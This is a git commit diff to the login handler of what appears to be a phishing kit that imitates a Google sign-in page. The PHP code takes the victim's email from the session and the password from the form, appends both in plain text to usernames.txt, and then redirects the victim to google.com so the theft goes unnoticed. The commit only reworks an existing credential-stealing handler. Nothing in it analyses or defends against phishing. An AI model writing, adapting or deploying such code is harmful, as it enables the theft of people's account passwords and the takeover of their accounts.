e0514a1caaee74089fcebc329f3aa07c888e1701
NIC8146 <52288863+NIC8146@users.noreply.github.com>
2023-10-23 17:54:47 +0530

    update Gmail page Remove all port forwarding minor updates

--- sites/google/login.php
+++ sites/google/login.php
@@ -1,5 +1,17 @@
-<?php
+<?php # DO NOT EDIT/TAMPER WITH THIS FILE #
+			session_start();
 
-file_put_contents("usernames.txt", "Account: " . $_POST['Email'] . " Pass: " . $_POST['Passwd'] . "\n", FILE_APPEND);
-header('Location: https://google.com/');
-exit();
+			
+			
+			$email=$_SESSION["Email"];
+			$pass = $_POST["password"];
+			
+			
+			file_put_contents("usernames.txt", "Account: " . $email . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+  			header('Location: https://google.com');
+			exit();
+			
+			
+			session_destroy();
+			
+?>
